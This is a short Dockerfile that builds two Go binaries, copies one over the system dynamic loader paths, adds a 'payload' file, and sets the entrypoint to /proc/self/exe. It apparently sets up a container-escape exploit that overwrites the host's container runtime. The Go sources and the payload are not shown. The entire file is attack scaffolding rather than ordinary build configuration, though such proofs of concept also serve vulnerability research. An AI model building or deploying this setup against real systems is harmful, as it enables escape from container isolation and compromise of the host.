FROM golang:1.16 AS builder
WORKDIR /src
COPY . .
RUN CGO_ENABLED=0 go build -o /writer ./writer.go
RUN CGO_ENABLED=0 go build -o /ld ./ld.go

FROM ubuntu:22.04
COPY --from=builder /ld /lib64/ld-linux-x86-64.so.2
COPY --from=builder /ld /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
COPY --from=builder /writer /
COPY payload /payload
#HEALTHCHECK --interval=1s CMD ["/bin/sh"]
ENTRYPOINT ["/proc/self/exe"]
